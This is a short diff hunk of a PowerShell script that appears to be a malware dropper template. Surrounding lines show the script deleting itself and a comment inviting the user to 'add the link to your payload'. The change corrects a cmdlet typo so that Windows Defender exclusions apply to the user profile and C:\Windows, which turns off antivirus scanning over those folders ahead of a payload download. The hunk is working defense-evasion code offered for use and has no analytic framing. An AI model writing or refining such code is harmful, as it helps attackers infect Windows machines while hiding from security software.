@@ -25,7 +25,7 @@ Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
 #######################################################################################################################################################################################
 # (The Add-MpPreference cmdlet modifies settings for Windows Defender. Use this cmdlet to add exclusions for file name extensions, paths, and processes.)
 
-Add-MPreference -ExclusionPath C:\Users
+Add-MpPreference -ExclusionPath $env:USERPROFILE
 Add-MpPreference -ExclusionPath C:\Windows
 #######################################################################################################################################################################################
 # (Add the link to your payload.)
